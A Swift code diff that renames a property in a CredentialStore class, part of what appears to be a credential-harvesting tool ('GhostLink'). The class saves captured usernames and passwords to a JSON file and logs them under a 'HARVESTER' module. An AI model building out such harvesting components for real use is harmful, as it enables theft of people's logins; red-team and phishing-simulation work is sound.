@@ -4,7 +4,7 @@ import Combine
 final class CredentialStore: ObservableObject {
     static let shared = CredentialStore()
 
-    @Published private(set) var credentials: [HarvestedCredential] = []
+    @Published private(set) var harvestedItems: [HarvestedCredential] = []
 
     private let fileName = "ghostlink_credentials.json"
 
@@ -12,13 +12,13 @@ final class CredentialStore: ObservableObject {
 
     func add(username: String, password: String) {
         let cred = HarvestedCredential(username: username, password: password)
-        credentials.insert(cred, at: 0)
+        harvestedItems.insert(cred, at: 0)
         persist()
         LogStore.shared.add(module: "HARVESTER", message: "Captured credentials for \(username)")
     }
 
     func clear() {
-        credentials.removeAll()
+        harvestedItems.removeAll()
         try? FileManager.default.removeItem(at: fileURL)
     }
 
@@ -28,7 +28,7 @@ final class CredentialStore: ObservableObject {
     }
 
     private func persist() {
-        if let data = try? JSONEncoder().encode(credentials) {
+        if let data = try? JSONEncoder().encode(harvestedItems) {
             try? data.write(to: fileURL)
         }
     }
@@ -36,6 +36,6 @@ final class CredentialStore: ObservableObject {
     private func load() {
         guard let data = try? Data(contentsOf: fileURL),
               let loaded = try? JSONDecoder().decode([HarvestedCredential].self, from: data) else { return }
-        credentials = loaded
+        harvestedItems = loaded
     }
 }
